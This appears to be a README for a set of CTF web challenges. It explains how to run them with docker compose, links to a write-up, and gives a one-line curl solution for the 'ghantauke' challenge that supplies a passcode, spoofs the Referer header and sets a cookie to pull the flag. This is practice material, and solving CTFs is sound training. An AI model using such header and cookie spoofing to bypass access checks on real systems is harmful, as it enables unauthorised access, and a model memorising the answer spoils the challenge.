## To Locally Play Web Challanges:
- Run `docker compose up -d` then access the challange.


# Writeup for 'Web' challanges:
- https://blog.rmb.info.np/nca-ctf-writeup (Credit: Rabindra Man Bajracharya)

Since **Ghantauke's Writeup** isn't available in above blog. Below is the one-liner solution for ghantauke challange:
```bash
curl -s 'http://147.79.67.234:5115/?passcode=opensesame' -H 'Referer: 127.0.0.1' -H 'DNT: 1' -H 'Cookie: MasterCookie=965eddc81173d4fe9c0ee6285fd56b996838fa67' | grep -o 'nca{[^}]*}'
```

